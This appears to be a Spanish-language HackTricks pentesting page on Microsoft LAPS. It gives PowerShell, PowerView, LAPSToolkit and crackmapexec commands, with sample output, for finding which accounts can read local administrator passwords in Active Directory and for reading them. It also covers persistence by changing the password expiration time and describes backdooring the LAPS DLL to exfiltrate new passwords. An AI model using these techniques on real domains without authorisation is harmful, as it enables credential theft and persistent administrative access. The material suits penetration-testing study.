# LAPS

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipo Rojo de AWS de HackTricks)</strong></a><strong>!</strong></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Información Básica

Local Administrator Password Solution (LAPS) es una herramienta utilizada para gestionar un sistema donde las **contraseñas de administrador**, que son **únicas, aleatorias y cambiadas con frecuencia**, se aplican a computadoras unidas a un dominio. Estas contraseñas se almacenan de forma segura dentro de Active Directory y solo son accesibles para usuarios que han sido otorgados permiso a través de Listas de Control de Acceso (ACLs). La seguridad de las transmisiones de contraseñas desde el cliente hasta el servidor está garantizada por el uso de **Kerberos versión 5** y **Estándar de Cifrado Avanzado (AES)**.

En los objetos de computadora del dominio, la implementación de LAPS resulta en la adición de dos nuevos atributos: **`ms-mcs-AdmPwd`** y **`ms-mcs-AdmPwdExpirationTime`**. Estos atributos almacenan la **contraseña de administrador en texto plano** y **su tiempo de expiración**, respectivamente.

### Comprobar si está activado
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Acceso a Contraseñas de LAPS

Podrías **descargar la directiva LAPS en bruto** desde `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` y luego utilizar **`Parse-PolFile`** del paquete [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) para convertir este archivo a un formato legible por humanos.

Además, los **cmdlets nativos de LAPS en PowerShell** pueden ser utilizados si están instalados en una máquina a la que tenemos acceso:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** también se puede utilizar para averiguar **quién puede leer la contraseña y leerla**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

El [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita la enumeración de LAPS con varias funciones. Uno de ellos es analizar **`ExtendedRights`** para **todos los equipos con LAPS habilitado**. Esto mostrará los **grupos** específicamente **delegados para leer contraseñas de LAPS**, que a menudo son usuarios en grupos protegidos. Una **cuenta** que ha **unido un equipo** a un dominio recibe `Todos los derechos extendidos` sobre ese host, y este derecho le otorga a la **cuenta** la capacidad de **leer contraseñas**. La enumeración puede mostrar una cuenta de usuario que puede leer la contraseña de LAPS en un host. Esto puede ayudarnos a **apuntar a usuarios AD específicos** que pueden leer contraseñas de LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Volcado de Contraseñas LAPS con Crackmapexec**
Si no hay acceso a un powershell, puedes abusar de este privilegio de forma remota a través de LDAP utilizando
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
## **Persistencia de LAPS**

### **Fecha de Expiración**

Una vez que se es administrador, es posible **obtener las contraseñas** y **evitar** que una máquina **actualice** su **contraseña** al **establecer la fecha de expiración en el futuro**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
La contraseña aún se restablecerá si un **administrador** utiliza el cmdlet **`Reset-AdmPwdPassword`**; o si está habilitada la opción **No permitir que la contraseña caduque más tiempo del requerido por la política** en la directiva de LAPS.
{% endhint %}

### Puerta trasera

El código fuente original de LAPS se puede encontrar [aquí](https://github.com/GreyCorbel/admpwd), por lo tanto es posible colocar una puerta trasera en el código (dentro del método `Get-AdmPwdPassword` en `Main/AdmPwd.PS/Main.cs` por ejemplo) que de alguna manera **exfiltre nuevas contraseñas o las almacene en algún lugar**.

Luego, simplemente compile el nuevo `AdmPwd.PS.dll` y súbalo a la máquina en `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (y cambie la hora de modificación).

## Referencias
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión del PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
